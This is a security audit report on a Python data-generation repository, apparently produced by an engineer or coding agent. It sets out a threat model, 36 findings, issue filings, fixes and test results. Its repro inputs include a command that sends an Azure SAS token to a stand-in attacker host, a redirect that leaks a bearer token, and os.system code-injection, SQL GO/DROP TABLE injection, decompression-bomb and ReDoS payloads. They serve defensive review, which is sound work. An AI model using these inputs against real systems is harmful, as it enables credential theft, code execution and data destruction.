# AUD-security2: whole-repository security review

Lane `lane/AUD-security2`, started from `int/INT-15` (5c91ea5). Brief: `docs/plans/AUDIT_BRIEF.md`.
Area: a whole-repository security review that complements AUD-privacy. It has a threat model per
entry point and a hunt for deserialization, path traversal, archive, injection, command,
secret-leak, SSRF, regex and resource defects. Paths: report and file an issue for every finding;
fix only findings in files that no other audit lane owns. `src/shape/security/` belongs to
AUD-privacy, so findings there are filed only.

Ownership used for "fix or file". These lanes were visible on 2026-10-03: AUD-builtins
(`src/shape/builtins/`), AUD-cli (`src/shape/cli/`, `__main__.py`), AUD-gen
(`src/shape/generation/`), AUD-profile (`src/shape/profile/`), AUD-stream (`src/shape/streaming/`),
AUD-privacy (`src/shape/security/`), AUD-ci, AUD-packaging (`pyproject.toml`, packaging) and
AUD-portability. Everything else (`bridge/`, `scale/`, `io/`, `scenario/`, `registry/`,
`fidelity/`, `runlog.py`, `plugins/shape-fabric`) is fixed here.

No D-xx or T-xx decision, gate or tolerance was touched. §11 and §2.3 were not edited.
`$SPINDLE_ROOT` was not touched (it is not present in this container). No test was skipped,
xfailed or weakened.

## Tools

| Tool | Command | Result |
|---|---|---|
| bandit 1.8 | `bandit -r src plugins/*/src` | 0 high, 0 medium. 139 low: 112 `assert` (B101), 13 false-positive "hardcoded password" (constants such as `TOKEN_SCOPE`), 9 B311 (`random` on synthetic data, by design), 2 B110, and B404/B603/B607 on `cli/gitcmds.py` (argv list, no shell). 22 `# nosec` lines, each reviewed: they are the parameterised or quoted SQL sites listed under "checked and safe". |
| semgrep 1.179 | `semgrep --config p/python --config p/security-audit src plugins/*/src` | 2 findings: dynamic `urlopen` in `scale/http.py:60` and `shape_fabric/kusto.py:54`. The scheme is fixed, but following redirects is a real defect (S3). |
| pip-audit 2.x | `pip-audit --skip-editable` in the `[dev,streaming,advanced]` venv with every plugin | 1 advisory: setuptools 79.0.1, PYSEC-2026-3447 (MANIFEST.in exclusions skipped for NFD names on macOS). It is a build tool in the venv, not a runtime dependency. No plugin has a `MANIFEST.in`, so it does not apply. Coverage of extras is #267 (AUD-ci/packaging). |

## Threat model by entry point

This complements `docs/THREAT_MODEL.md` (P7-04). That model covers the `.shape` container,
parsing, writers, sinks and secrets. This one walks each entry point. "Trust" says who controls
the input; "Controls" names what already holds (with the test or the finding that checked it).
"Gaps" names the findings below.

### 1. CLI arguments and the files they name

- **Trust:** the arguments are the user's own. The files they name (`.shape`, profile JSON,
  generation schemas, GSL and pack YAML, DDL, contracts, CSV, JSONL, Parquet, Excel, Delta) can come
  from anyone.
- **Controls:** YAML goes through `security/yamlsafe.py` (SafeLoader, 4 MiB, alias and depth limits;
  verified against billion laughs, a 50k-deep document and recursive aliases). Table names are
  checked by `security/names.py` and re-checked at every writer. `.shape` has member, size and ratio
  limits and nothing is ever extracted. There is no pickle, marshal or eval on data (bandit, grep).
  The formula strategy is an `ast` allow-list (verified against `__import__`, attributes,
  subscripts, lambdas and `__globals__`). Strategies, sinks, sources and domains resolve by registry
  lookup only; no "module:attr" string is ever imported.
- **Gaps:** JSONL depth guard bypassed (S1, S2, S8); spreadsheet and Parquet bombs (S10, S15); the
  pack-run manifest path (S9); a registry manifest bomb (S11); crash-path redaction (S6); quadratic
  regexes on data values (S20, S21, S22).

### 2. `shape bridge`: stdin/stdout and the jobs directory

- **Trust:** the caller is the program that started the bridge. By design (`docs/BRIDGE.md`,
  Security) it has the user's permissions and may name any path to read or write, so unconfined
  paths are not a finding. Credentials passed to it must not leak to job files, results or logs,
  and one bad request must not take the process down.
- **Controls:** an 8 MiB request cap; `RecursionError` on deep JSON becomes an error response
  (verified with a 100k-deep `args`). Job ids are regex-checked; job files are written with mkstemp,
  mode 0600 and `os.replace`; the default dirs are 0700. Secret-named keys are masked in job
  records. Spilled results are named by SHA-256.
- **Gaps:** error messages are not redacted (S5). Job files keep passwords inside URIs and error
  text (S7). Whole-process segfault on a crafted JSONL `profile` source (S1, S2). Existing job dirs
  keep their mode, one bad job file breaks `job_list`, and ids accept a trailing newline (S18).
  `preview` generates the whole `small` scale before slicing (accepted risk R2).

### 3. Plugins and entry points

- **Trust:** installed plugins are trusted in-process code (D-09, R1). Input data must not choose
  what code runs.
- **Controls:** `plugins/host.py` imports only entry-point or registered targets. Lazy
  `__getattr__` tables are fixed. scipy distribution names are checked (`quality/gates.py`). The
  chaos action has an allow-list.
- **Gaps:** the faker strategy calls any attribute a spec names, with spec-chosen kwargs (S16).
  This is a denial of service, not code execution.

### 4. Input formats: YAML, JSON, TOML, Parquet, Excel, Delta, Arrow IPC

- **Controls:** YAML as above. Profile and model JSON go through `validate_structure` (depth 64,
  1M items). The Excel reader is read-only, `data_only`, with a per-member size-and-ratio refusal.
  Arrow IPC never auto-loads Python extension types (verified with a pickled
  `arrow.py_extension_type` payload: `UnknownExtensionType`, nothing ran). TOML uses `tomllib`.
  Delta logs are read by delta-rs.
- **Gaps:** the JSONL depth guard (S1, S2, S8); the XLSX shared-strings bomb (S10); the Parquet
  decompression bomb (S15). openpyxl's XML hardening relies on `defusedxml`, which is installed
  by chance and not declared (S34).

### 5. Outputs: SQL scripts, databases, Kafka, Event Hubs, Fabric (Lakehouse, Warehouse, SQL DB, Eventhouse, Eventstream), Delta, files

- **Controls:** every live statement quotes identifiers with a correct helper (`quote_ident`,
  `_tsql.ident`, `_sql.quote`, `kusto.q`, DAX and M escapes) and binds values (`?`, `%s`, COPY).
  SQL Server defaults to `Encrypt=yes`, `TrustServerCertificate=no`. Kafka `sasl.password` and
  Event Hubs connection strings did not leak on two failure paths each.
- **Gaps:** line breaks in generated T-SQL scripts make `GO` batch injection possible, and
  PostgreSQL literals depend on `standard_conforming_strings` (S13). Credentials reach any
  `abfss://` host (S4). Bearer tokens follow redirects (S3). The KQL sink's database name can
  change the URI (S25). The scale Parquet sink follows planted symlinks (S17). Postgres and MySQL
  do not require TLS (S23). The file sinks write through hardlinks (S28).

### 6. Notebook and code generation

- **Controls:** `shape_spark_worker.ipynb` takes regex-checked values; `demo/notebook.py` uses
  `repr`. The ADF Batch command quotes its image. The Fabric UDF checks its table name.
- **Gaps:** `shape_fabric.notebook.generate_notebook()` puts `domain`, `seed` and `version` into
  code unquoted (S12). The CLI checks them; the library function does not. Regexes use `$`, which
  lets a trailing newline through (S33).

### 7. Webhooks, listeners and outbound HTTP

- **Controls:** no HTTP server, webhook or listening socket ships; the bridge is stdio only
  (verified). Outbound calls are https-only at the first hop. There is no `verify=False` or
  unverified SSL context anywhere. Key Vault hosts are fixed and names validated.
- **Gaps:** redirects carry the bearer token to any scheme and host (S3). The Fabric `Location` and
  `continuationUri` are followed without a host check (S3). `abfss://` accepts any host (S4).

### 8. Secrets in logs, errors and manifests

- **Controls:** `cli.errors.fail` redacts; scale jobs and sink configs redact; `HttpError` drops
  query strings; `Credentials.__repr__` masks; credential-reference errors name only the exception
  type; artifacts are scanned by `enforce_no_secrets`.
- **Gaps:** bridge errors (S5), the CLI crash path (S6), job files (S7), `--log-json` (S19), and
  `redact_text` misses some formats and is quadratic on `a.a.a.` (S20).

## Phase 1: findings

Severity is judged for a CLI and library that read files anyone can hand a user, and a bridge
driven by another program. "Owner" says who fixes it; "file only" means another audit lane owns
the file.

1. **S1 — high — JSON depth guard bypassed by `]` inside a string: pyarrow segfaults.**
   `src/shape/security/jsondepth.py:38-43`. The guard counts brackets inside strings, so a string
   of `]` makes the running depth negative and a deep array after it is accepted.
   Repro: one line `{"pad":"` + 200000×`]` + `","a":` + 200000×`[` + 200000×`]` + `}`;
   `shape profile bypass.jsonl -o b.shape` and `shape quality bypass.jsonl` exit 139 (SIGSEGV). A
   bridge `profile` request with it kills the bridge and every job in it.
   Expected: "JSON is nested deeper than 128 levels". Owner: AUD-privacy (file only).
2. **S2 — high — `.jsonl.gz` skips the depth guard.** `src/shape/io/readers.py:300-307`.
   `check_json_file` scans the compressed bytes, and then `pajson.read_json` decompresses.
   Repro: `read_table("deep.jsonl.gz")` (a 200000-deep line, 447 bytes) exits 139; the same
   content uncompressed gives `ReaderError`. Owner: this lane (fix).
3. **S3 — medium — bearer tokens follow redirects to any scheme and host.**
   `src/shape/scale/http.py:56-60`, `plugins/shape-fabric/src/shape_fabric/kusto.py:49-57`.
   urllib's default redirect handler copies `Authorization` to the new URL. Repro: an https server
   answering `302 Location: http://127.0.0.1:8080/stolen`; `Http(token).request("GET", ...)` sends
   `Bearer <token>` in cleartext to :8080. Through the bridge's kql sink the
   `SHAPE_EVENTHOUSE_TOKEN` leaked the same way, and the POST turned into a GET that reported
   `ok`. Related: `scale/spark.py:185-187, 249-260` and `shape_fabric/fabric_api.py:144-155`
   follow a `Location` or `continuationUri` header with the token and no host check.
   Expected: no cross-origin redirect is followed and the token never leaves the origin.
   Owner: this lane (fix).
4. **S4 — medium — an `abfss://` URI with any host receives the user's SAS, account key or Entra
   storage token.** `src/shape/builtins/sources/azure.py:57-64, 93-94`,
   `src/shape/builtins/sinks/azure.py:93-96, 148-161`. Repro (adlfs stub):
   `AZURE_STORAGE_SAS_TOKEN=... shape generate retail --to abfss://raw@attacker.example.net/x`
   passes the SAS with `account_host="attacker.example.net"`. Expected: only Azure Storage, OneLake
   and sovereign-cloud hosts. Owner: AUD-builtins (file only).
5. **S5 — medium — bridge error responses are not redacted.** `src/shape/bridge/errors.py:47,
   111-115`. Repro: `{"command":"generate","args":{"domain":"Server=db;UID=sa;PWD=X"}}` returns
   `no domain named 'Server=db;UID=sa;PWD=X'`; the CLI prints `PWD=***`. The `internal.error` path
   returns `str(exc)` as is. Owner: this lane (fix).
6. **S6 — medium — the CLI's unexpected-error path prints secrets.** `src/shape/cli/main.py:
   1326-1331`. Only the expected error types go through the redacting `errors.fail`. A
   `RuntimeError("... PWD=X")` (pyodbc, KafkaException, HttpError, plugin AuthError) is printed raw.
   Owner: AUD-cli (file only).
7. **S7 — medium — bridge job files keep credentials inside URIs and error text.**
   `src/shape/bridge/jobs.py:59-69, 195`. Masking is by key name only. Repro: an async `profile` of
   `postgresql://sa:hunter2SECRET@127.0.0.1:1/db` writes the password twice into
   `bridge/job-*.json` (the `source` argument and the error message). `docs/BRIDGE.md` says a
   credential "is never written to a job file". Owner: this lane (fix).
8. **S8 — medium — the abfss/OneLake JSONL source has no depth guard.**
   `src/shape/builtins/sources/azure.py:162-163`. Repro: `_Opened(memory fs, deep.jsonl)` exits
   139. Owner: AUD-builtins (file only).
9. **S9 — medium — a schema's `model.domain` or scale name puts the `shape pack run` manifest
   outside `--output`.** `src/shape/scenario/manifest.py:128, 182`,
   `src/shape/scenario/runner.py:184-189`. Repro: a GSL spec whose schema file has
   `model.domain = "../../../../ESCAPED_DOMAIN"`; `shape pack run spec.gsl.yaml --output out`
   exits 0 and writes `ESCAPED_DOMAIN_small_s1_manifest.json` two levels above `out`. Related
   (low): `runner._landing` creates the landing dir before its containment check
   (`runner.py:209-217`). Owner: this lane (fix).
10. **S10 — medium — XLSX shared-strings bomb.** `src/shape/io/excel.py:146-160`. A member is
    refused only when it is over 256 MiB *and* inflates more than 1000×; there is no total budget.
    Repro: a 623,700-byte workbook whose `sharedStrings.xml` inflates 412× to 255 MB: 1.5 GB RSS
    and 262 s. Owner: this lane (fix).
11. **S11 — medium — registry raw-profile check reads `manifest.json` without a limit.**
    `src/shape/registry/local.py:33-41`. Repro: a 1 MB zip whose manifest inflates to 1 GiB;
    `shape registry r commit x bomb.shape` reaches 2 GB RSS. The bounded `read_manifest_bytes`
    exists and is not used here. Owner: this lane (fix).
12. **S12 — medium — `generate_notebook()` puts `domain`, `seed` and `version` into notebook code
    unquoted.** `plugins/shape-fabric/src/shape_fabric/notebook.py:56, 62, 87, 103`. Repro:
    `generate_notebook("retail{__import__('os').system('id')}")` gives an f-string line that runs
    `id`; a csv-target domain with `'` or a newline, a string seed, and a version with a newline
    each add code or a `!cmd` line. The CLI checks the domain against installed plugins, so the
    library API is the exposure. Owner: this lane (fix).
13. **S13 — medium — generated T-SQL scripts allow `GO` batch injection; PostgreSQL literals
    depend on `standard_conforming_strings`.** `src/shape/builtins/sinks/sql.py:110-115, 148-173`,
    reused by `src/shape/design/ddl.py:23-28, 58, 66-68`. A name or value with a line break writes
    `x` / `GO` / `DROP TABLE ...` / `GO` on separate lines; `shape design evil.json --dialect tsql`
    exits 0. A Postgres literal `'\''; DROP TABLE victim; --'` is safe only with
    `standard_conforming_strings=on`. Owner: AUD-builtins (file only).
14. **S14 — low — bridge `preview` generates the whole `small` scale before slicing**
    (`bridge/handlers/generate.py:99`). A file declaring `small = 300000000` rows exhausts memory
    with `rows=1`. This is accepted residual risk R2 (a declared scale is a resource request) and
    `total_rows` is part of the published result, so it is recorded, not filed.
15. **S15 — low — Parquet decompression bomb.** A 4.3 KB file of 100M constant rows reaches 4 GB
    RSS in `shape profile`. No reader checks `num_rows` or the uncompressed size. Covered by R2
    for row counts; filed for AUD-profile as a missing budget (file only).
16. **S16 — low — the faker strategy calls any attribute a spec names, with spec-chosen kwargs;
    a deep formula raises `RecursionError`.** `src/shape/builtins/strategies/providers.py:387-392`
    (`__init__`, `__reduce_ex__`, `add_provider` accepted; `paragraphs` with `nb=10**8` hangs),
    `src/shape/builtins/strategies/formula.py:140-154` (`'-'*1990+'1'`). Owner: AUD-builtins
    (file only).
17. **S17 — low — the scale Parquet sink follows planted symlinks and uses fixed temp names.**
    `src/shape/scale/sinks/parquet.py:94, 119-129, 155-163`, `src/shape/scale/chunk_worker.py:58`.
    Repro: `out/customer/_COMPLETE.tmp -> victim.txt`, then
    `shape generate retail --scale-mode local_single --sink parquet -o out` overwrites
    `victim.txt`; `out/customer -> elsewhere` writes the parts into `elsewhere/`. Precondition:
    someone else can write in the output dir. Owner: this lane (fix).
18. **S18 — low — job dirs.** `src/shape/bridge/jobs.py:44, 103, 116-131, 305-312`. (a) An
    existing `bridge/` dir keeps a wider mode (0777 stays 0777). (b) One bad job file (deep JSON,
    missing `created_at`) breaks `job_list` for every job. (c) `^job-[0-9a-f]{12}$` with
    `re.match` accepts a trailing newline (also `scale/jobs.py:49`, `demo/home.py:14`).
    Owner: this lane (fix).
19. **S19 — low — `--log-json` records are not redacted.** `src/shape/runlog.py:39-51`.
    `logger.exception` on `RuntimeError("PWD=X")` and `extra={"connection_string": ...}` are
    written as is (callers: demo modes, `bridge/errors.py:111`). Owner: this lane (fix).
20. **S20 — low — `redact_text` misses dict, JSON and `sasl_password=` forms, keeps part of a
    password containing `@`, and its URL pattern is quadratic.** `src/shape/security/redact.py:
    20-28`. `'a.'*60000` takes 9 s through `shape describe`. Owner: AUD-privacy (file only).
21. **S21 — low — the secret scanner's Event Hubs pattern is quadratic.**
    `src/shape/security/hardening.py:25`. `shape capture` of a 3-row CSV holding
    `"Endpoint=sb://"*20000` takes 28 s (0.6 s for a control). Owner: AUD-privacy (file only).
22. **S22 — low — the tier-2 e-mail pattern is quadratic.** `src/shape/fidelity/tier2.py:32`.
    `"a@" + "."*20000 + "@"` takes 3 s per value, up to 500 values per column. Owner: this lane
    (fix).
23. **S23 — low — the Postgres and MySQL sinks do not require TLS.**
    `plugins/shape-databases/src/shape_databases/postgres.py:72-79`, `mysql.py:79-86`. Changing the
    default is a behaviour change for local and emulator use, so it is filed for the owner.
24. **S24 — merged into S13** (PostgreSQL literals).
25. **S25 — low — `KqlSink` puts `database` into the `eventhouse://` URI unencoded.**
    `src/shape/scale/sinks/fabric.py:223`. `database="salesdb?tls=false"` switches the Kusto base
    URL to `http://`; `"db/other"` changes the table. Owner: this lane (fix).
26. **S26 — low — the DuckDB Delta fallback splices the account name into an Azure connection
    string.** `src/shape/profile/reference/delta_fallback.py:103-112`.
    `abfss://c@acct;EndpointSuffix=attacker-host.dfs.core.windows.net/t` adds
    `EndpointSuffix=attacker-host` next to the user's SAS. Owner: AUD-profile (file only).
27. **S27 — merged into S9** (landing dir created before the check).
28. **S28 — low — the file sinks write the final path in place.** `src/shape/builtins/sinks/
    files.py:43-100`. A hardlink `out/customer.csv -> victim.txt` is written through. Owner:
    AUD-builtins (file only).
29. **S29 — info — `.shape` limits are generous** (512 MiB per member, 1 GiB total, ratio 200): a
    9.4 MB file inflates to about 1 GB before it is refused. These are the documented P7-04 limits;
    recorded, not filed.
30. **S30 — low — checkpoint state is `zlib.decompress`ed with no size limit.**
    `src/shape/streaming/keyed.py:176-179`, `runtime.py:168-170`, `dedupe.py:219-221`. Owner:
    AUD-stream (file only).
31. **S31 — merged into S16** (formula `RecursionError`).
32. **S32 — low — the Fabric UDF returns exception text to its remote caller unredacted.**
    `src/shape/integrations/fabric/udf.py:147, 158, 166, 290`. Code read only. Owner: this lane
    (fix with S5's redaction).
33. **S33 — info — regexes that use `$` with `re.match` accept a trailing newline.**
    `src/shape/scale/spark.py:36-41` (a GUID plus `\n` is spliced into the worker notebook JSON
    and makes it invalid; no code runs), `shape_fabric/warehouse.py:43`. `scale/spark_worker.py:54`
    puts column names in backticks without doubling (a schema string, not executed SQL). Owner:
    this lane (fix).
34. **S34 — info — `defusedxml` is not declared.** openpyxl uses it when present for XML
    hardening; the venv has it only as a transitive dependency. Owner: AUD-packaging (file only).
35. **S35 — info — the bridge writes and reads any path a request names.** By design
    (`docs/BRIDGE.md`, Security). Recorded in the threat model, not filed.
36. **S36 — info — smaller notes, not filed.** `semantic_model.m_text` leaves M's `#(` escape
    alone (meaning changes, no breakout). `onelake.parse` decodes `%2e%2e` (the user's own path).
    `shape simulate KEY=VALUE` uses `ast.literal_eval` (operator input).

### Checked and safe (cited by the threat model)

- **Deserialization.** No pickle, marshal, joblib, `np.load(allow_pickle)`, `read_pickle`, eval or
  exec on data in `src` or `plugins/*/src`. Every YAML load goes through `yamlsafe` (a
  `!!python/object/apply:os.system` document gives `ConstructorError`).
- **Commands.** The only shipped subprocess is `cli/gitcmds.py:100`: an argv list, no shell.
- **Archives.** Nothing outside tests calls `extractall`, `tarfile` or `unpack_archive`; members are
  read into memory with limits (`artifact/io.py:94-108, 181-287`).
- **SQL, KQL, DAX and M.** `shape_sqlserver/sql.py:51-174`, `shape_fabric/_tsql.py:52-188, 305`,
  `sqldb.py:94-110`, `warehouse.py:46-62`, `kusto.py:65-142`, `eventhouse_writer.py:118-139`,
  `semantic_model.py:44-61`, `shape_databases/_sql.py:39-151`, `_base.py:174-224`,
  `delta_fallback.py:180-184`, `integrations/fabric/udf.py:70, 280-286`, `query/core.py:15-105`.
- **Paths.** `security/names.py:14-41`, `generation/output.py:130-136, 186`,
  `builtins/sinks/files.py:47-58`, `io/store.py:108-126`, `registry/local.py:17, 51-69`,
  `demo/cleanup.py:148-169`, `artifact/keys.py:213-229`, `bridge/context.py:56-87`.
- **TLS.** No `verify=False`, `CERT_NONE` or unverified context anywhere.
- **Listeners.** None ship.

## Phase 2: issues

| Finding | Issue | Owner | Action |
|---|---|---|---|
| S1 | #273 | AUD-privacy | file only |
| S2 | #274 | this lane | fix |
| S3 | #275 | this lane | fix |
| S4 | #276 | AUD-builtins | file only |
| S5 | #277 | this lane | fix |
| S6 | #278 | AUD-cli | file only |
| S7 | #279 | this lane | fix |
| S8 | #280 | AUD-builtins | file only |
| S9, S27 | #281 | this lane | fix |
| S10 | #282 | this lane | fix |
| S11 | #283 | this lane | fix |
| S12 | #284 | this lane | fix |
| S13, S24 | #285 | AUD-builtins | file only |
| S15 | #286 | AUD-profile | file only |
| S16, S31 | #287 | AUD-builtins | file only |
| S17 | #288 | this lane | fix |
| S18 | #289 | this lane | fix |
| S19 | #290 | this lane | fix |
| S20 | #291 | AUD-privacy | file only |
| S21 | #292 | AUD-privacy | file only |
| S22 | #293 | this lane | fix |
| S23 | #294 | owner decision (default TLS changes local use) | file only |
| S25 | #295 | this lane | fix |
| S26 | #296 | AUD-profile | file only |
| S28 | #297 | AUD-builtins | file only |
| S30 | #298 | AUD-stream | file only |
| S32 | #299 | this lane | fix |
| S33 | #300 | this lane | fix |
| S34 | #301 | AUD-packaging | file only |

S14, S29, S35 and S36 are recorded, not filed (accepted risk R2, documented limits, by design, or
no effect).

## Phase 3: fixes

Each fix has a regression test committed first (it failed before the fix; the failing output is in
that commit's message), then the fix. CHANGELOG.md, "Fixed (security review)": 559b12a.

| Finding | Issue | Test commit | Fix commit | Fix |
|---|---|---|---|---|
| S2 | #274 | 12da0c6 | 5bd9684 | `check_json_file` reads the decompressed lines of `.gz`/`.bz2`/`.zst` JSONL |
| S3 | #275 | d2d0e16 | 5b8d27e | no redirect is followed with a bearer token; `Location` and `continuationUri` must stay on the request's origin |
| S5 | #277 | 5a8a868 | e76525d | bridge error messages, warnings and the `internal.error` log go through `redact_text` |
| S7 | #279 | ce3f78f | 72bae0a | job records redact every string value, not only secret-named keys |
| S9, S27 | #281 | db57c74 | 398a2dc | pack runs refuse a domain or scale name that is a path; the landing dir is checked before `mkdir` |
| S10 | #282 | 1da2e37 | 188b14d | a workbook part over 16 MiB that inflates more than 100x is refused |
| S11 | #283 | bda735e | 7c44297 | the raw-profile check reads `manifest.json` through the bounded artifact reader |
| S12 | #284 | f733e51 | b9ca045 | `generate_notebook` refuses a domain, seed or version that could become code |
| S18 | #289 | 84df47e | 79e5c22 | jobs dir forced to 0700, a bad job file is skipped by `job_list`, ids use `fullmatch` |
| S17 | #288 | 746cd6d | 86153d6 | scale Parquet parts and markers use `O_EXCL` temp files in a contained table dir |
| S19 | #290 | bbc9ffa | e1d2819 | JSON run-log records redact the message, string extras, secret-named extras and the exception |
| S22 | #293 | 40c348d | 394d58a | a linear tier-2 e-mail pattern that accepts exactly what the old one did |
| S25 | #295 | 64d8ca0 | b53f690 | the kql sink percent-encodes the database name into one URI segment |
| S32 | #299 | 4063fee | 9c7fb7c | the Fabric UDF redacts the error text it returns |
| S33 | #300 | 7419c9f | 6e6cc7c | Spark and COPY INTO checks use `fullmatch`; backticks in Spark column names are doubled |

### Left open

Every finding owned by this lane is fixed. These stay open for their owners (filed only, no code
changed here): #273 and #291, #292 (AUD-privacy, `src/shape/security/`); #276, #280, #285, #287,
#297 (AUD-builtins); #278 (AUD-cli); #286, #296 (AUD-profile); #298 (AUD-stream); #301
(AUD-packaging); #294 (owner decision: requiring TLS by default changes local and emulator use).
No `.github/workflows` change is needed.

## Checks (final session, at 7f75dc6 plus this status update)

`origin/build/main-plan` is 5c91ea5 (INT-15), already the lane's base, so there was nothing to
merge. Environment: Python 3.11.15, `~/.venvs/shape` with `pip install -e ".[dev,streaming,advanced]"`
and every plugin under `plugins/` installed editable, pyarrow 25.0.1, numpy 2.4.6, Rust stable,
unixODBC from apt.

| Command | Result |
|---|---|
| `make check PYTHON=python` | exit 0. ruff, format, mypy, compileall, vulture, lint-imports and every `scripts/check_*.py` clean; 6832 passed, coverage 92.62% (gate 86); heavy 42 passed; `SHAPE_KERNEL=python` kernel 265 passed; cargo fmt, clippy `-D warnings` and 34 cargo tests pass |
| `python scripts/check_user_facing.py` | `check_user_facing: clean` |
| `SHAPE_KERNEL=rust pytest -m "not emulator and not live" --ignore=tests/demo/fabric --ignore=tests/demo/content` | 6874 passed, 13 deselected (the marker), exit 0 |
| `SHAPE_KERNEL=python pytest -m "not emulator and not live" --ignore=tests/demo/fabric --ignore=tests/demo/content --ignore=tests/profile` | 6582 passed, 13 deselected (the marker), exit 0 |
| `SHAPE_KERNEL=python pytest -m "not emulator and not live" tests/profile` | 292 passed, exit 0 (`test_bounded_mode_memory_does_not_grow_with_rows` alone took 81 min on the Python kernel) |
| `SHAPE_KERNEL=rust pytest -m "not emulator and not live" tests/demo/fabric tests/demo/content` (demo venv) | 254 passed, exit 0 |
| `SHAPE_KERNEL=python pytest -m "not emulator and not live" tests/demo/fabric tests/demo/content` (demo venv) | 254 passed, exit 0 |

Together these runs cover the whole `pytest -m "not emulator and not live"` suite in both kernel
modes. Nothing was deselected beyond the marker, and nothing was skipped or xfailed.

How the suite was split, and why (the spec is silent here, so this is the choice that runs every
test without widening scope):

- `tests/demo/fabric` and `tests/demo/content` ran in a second venv, `~/.venvs/shape-demo`
  (`pip install -e '.[dev]' -r tests/demo/fabric/requirements.txt`), the same way the CI demo job
  in `ci.yml` installs them. That requirements file includes `fabric-user-data-functions`, which
  pins `pyarrow<20` and installs `azure-functions`. Installed into the main venv, it downgraded
  pyarrow to 19.0.1, and a full rust run there failed 5 tests (float16 hashing, a dictionary-typed
  partition column, the cloud-SDK import guard and the bounded-memory ratio). All 5 pass again
  after restoring pyarrow 25.0.1 and removing those packages. They come from the venv, not this
  lane. Without that package, `tests/demo/fabric/test_udf.py` cannot be collected (`No module
  named 'fabric'`), which is why the main runs pass the two `--ignore`s.
- The Python-kernel run did `tests/profile` separately. Inside one run it went past the tool's
  2-hour limit, because the heavy bounded-memory test is slow on the Python kernel.
- `pip install -e plugins/*` leaves `plugins/*/build/` behind (git-ignored). The first
  `make check` then failed `test_every_skeleton_builds_a_pure_wheel` ("build left files in the
  source tree"). The directories were removed before each run; this is an artefact of the
  environment.

### Pre-existing intermittent failure (not this lane's; filed #512)

`tests/cli/test_generate_to.py::test_to_postgresql_routes_to_the_database_sink` failed once in
the first `make check` with `writing "order" ... failed (RuntimeError): dictionary changed size
during iteration`. Cause: `shape_databases.testing.FakeServer` is shared across the CLI's writer
threads, and `begin()` deep-copies `tables` while another thread appends to it. Evidence: 60
repeated runs on `origin/build/main-plan` (5c91ea5) in the same venv failed 3 times with the same
error, and 40 runs on this branch failed twice. This lane does not touch the file
(`plugins/shape-databases`), so it was filed as #512 with a suggested lock, not fixed here. The
second `make check` passed.
